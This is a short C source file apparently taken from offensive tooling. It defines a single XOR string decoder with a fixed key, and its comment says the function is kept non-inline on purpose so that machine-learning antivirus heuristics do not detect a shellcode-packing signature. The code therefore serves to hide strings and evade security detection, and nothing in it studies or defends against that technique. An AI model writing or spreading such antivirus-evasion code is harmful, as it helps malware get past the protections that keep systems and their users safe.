#include "evs.h"
#include "evs_strings.h"
#include <stddef.h>

/*
 * Single XOR decoder — noinline so the compiler emits exactly one copy.
 *
 * Why noinline matters:
 *   100+ EVS_D() calls with inline expansion = 100+ identical 3-instruction
 *   XOR loops scattered through .text. ML-based AV heuristics treat a high
 *   density of identical short loops as a shellcode-packing signature.
 *   One called function does not match that pattern.
 */
__attribute__((noinline))
void evs_dec(char *out, const unsigned char *enc, size_t n)
{
    unsigned char k = EVS_KEY;
    for (size_t i = 0; i < n; i++)
        out[i] = (char)(enc[i] ^ k);
    out[n] = '\0';
}
